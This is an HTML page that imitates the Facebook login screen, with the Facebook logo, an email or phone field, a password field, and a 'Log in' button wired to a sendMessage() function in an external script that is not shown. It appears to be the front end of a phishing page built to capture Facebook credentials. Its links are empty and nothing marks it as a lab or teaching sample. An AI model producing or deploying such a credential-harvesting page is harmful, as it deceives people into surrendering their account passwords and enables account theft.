<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    <link rel="stylesheet" href="style.css" />
    <title>Document</title>
  </head>
  <body>
    <section class="form-page">
      <div class="header"><img src="./images/fb.svg" alt=""></div>
      <form class="login-form">
        <h2 class="title">Log Into Facebook</h2>
        <input type="text" required placeholder="Email or phone number" id="number"/>
        <input type="password" required placeholder="Password" id="password"/>
        <button class="btn login" onclick="sendMessage()">Log in</button>
        <div class="login-link">
          <a href="">Forgot account?</a>
          <a href="">Sign up for Facebook</a>
        </div>
      </form>
    </section>


    <script src="script.js"></script>
  </body>
</html>
